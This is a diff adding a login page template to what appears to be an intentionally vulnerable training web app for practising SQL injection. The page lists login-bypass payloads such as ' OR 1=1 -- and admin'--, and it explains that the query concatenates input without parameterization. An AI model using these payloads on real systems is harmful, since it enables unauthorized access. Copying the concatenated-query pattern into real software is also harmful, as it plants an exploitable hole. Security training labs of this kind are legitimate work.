@@ -1,0 +1,53 @@
+<%- include('partials/header') %>
+
+<div class="auth-wrap">
+  <div class="auth-card">
+    <div class="auth-header">
+      <div class="vuln-badge sqli">SQL Injection Point</div>
+      <h2>Login</h2>
+    </div>
+
+    <% if (error) { %>
+      <div class="alert error"><%= error %></div>
+    <% } %>
+
+    <form method="POST" action="/login">
+      <div class="form-group">
+        <label>Username</label>
+        <input type="text" name="username" placeholder="e.g. admin" autocomplete="off" required>
+      </div>
+      <div class="form-group">
+        <label>Password</label>
+        <input type="password" name="password" placeholder="password">
+      </div>
+      <button type="submit" class="btn btn-primary">Login</button>
+    </form>
+
+    <div class="exploit-box">
+      <h4>Try These Payloads</h4>
+      <div class="payload-list">
+        <div class="payload">
+          <span class="payload-label">Login Bypass:</span>
+          <code>' OR 1=1 --</code>
+          <span class="payload-hint">(in username field, any password)</span>
+        </div>
+        <div class="payload">
+          <span class="payload-label">Admin bypass:</span>
+          <code>admin'--</code>
+          <span class="payload-hint">(skip password check for admin)</span>
+        </div>
+        <div class="payload">
+          <span class="payload-label">Error-based:</span>
+          <code>' OR '1'='1</code>
+        </div>
+      </div>
+      <p class="vuln-explain">
+        <strong>Why it works:</strong> The query is built as:<br>
+        <code>SELECT * FROM users WHERE username = '<strong>[INPUT]</strong>' AND password = '...'</code><br>
+        No parameterized queries = SQL Injection.
+      </p>
+    </div>
+  </div>
+</div>
+
+<%- include('partials/footer') %>
